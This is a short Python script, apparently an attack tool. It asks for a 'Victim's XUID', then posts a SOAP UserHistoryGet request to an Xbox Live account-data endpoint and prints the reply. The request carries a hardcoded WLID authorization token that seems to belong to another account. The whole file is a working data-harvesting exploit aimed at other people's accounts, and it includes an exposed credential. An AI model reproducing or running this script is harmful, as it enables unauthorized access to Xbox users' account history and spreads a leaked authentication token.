import requests

xuid = input("Enter Victim's XUID: ")

xml = f"""<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UserHistoryGet xmlns="urn:schemas-xbox-com:user-account-data">
      <userPuid>{xuid}</userPuid>
      <since>2012</since>
    </UserHistoryGet>
  </soap12:Body>
</soap12:Envelope>"""

headers = {"Authorization":"WLID1.0 t=GAA+AgMAAAAMgAAADQAgpt8BDtvXVosrr2fgmCKTMrAfXt6XB8Kx1H/H+Tc6yvIAAaQee4wTvRnNi6r80LHkt2Q1aT3jHOjY8iBCM4KBpq58p0yXuzylarDXfA4tNQnBI0rUEdo6vEii4eeDyd/gJNFlAFAg78sv+9Xx5skhd6GAbHHleOefvQWcqNwkxq1iMIAzVTj8RIJML3oMy6RFwows2PvJdat7EbJpGh+lWZca8aUTOPyUHArsGXOoMuVFevA3l1YaQbv4OrF/XqsDfmcAMSlriAEYEkpqYggtSwZfdUvHwRNCtR/SUKvdn7wfnKimevF8Kx+OWNBs7h30eiumAAA5DNl+bbc5BZ4O8iDbFBXStBSXIQ5V42KU53WBRM6VbqWXIs7urNtY9DZ/OwALAXsACwEAAAMAd1mxSTcoLWIfHyliv3YEAAoQIAAQFABkMzN6bnV0c0ByaXNldXAubmV0AFQAACBkMzN6bnV0cyVyaXNldXAubmV0QHBhc3Nwb3J0LmNvbQAAAANVUwAAAAAAAAQJAgAAjc1VQAAGQQADenp6AAN6enoAAAAAAAAAAAAAAAAAAAAAAACeMAaVZutyrQAANygtYh/Gn2IAAAAAAAAAAAAAAAANADY4LjIzNS40My4xNAACAQAAAAAAAAAAAAAAAAEEAAAAAAAAAAAAAAAAAAAAPcvO1VwxwFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAA==",
"Content-Type":"application/soap+xml; charset=utf-8","Content-Length":"430"}

rq = requests.post("https://activeauth.xboxlive.com/xuacs/useraccount.asmx", data=xml, headers=headers).text

print("\n" + rq)